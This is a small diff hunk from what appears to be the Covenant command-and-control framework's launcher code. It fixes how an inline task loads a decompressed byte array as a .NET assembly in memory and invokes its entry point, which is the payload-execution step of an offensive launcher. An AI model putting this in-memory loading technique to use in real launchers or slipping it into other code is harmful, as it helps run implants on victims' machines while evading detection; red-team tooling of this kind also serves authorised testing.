@@ -69,7 +69,7 @@ namespace Covenant.Models.Launchers
                 oms.Write(by, 0, r);
                 r = ds.Read(by, 0, 1024);
             }
-            System.Reflection.Assembly.Load(oms.ToArray()).EntryPoint.Invoke(0, new object[] { });
+            System.Reflection.Assembly.Load(oms.ToArray()).EntryPoint.Invoke(0, new object[] { new string[]{ } });
         ]]>
       </Code>
     </Task>
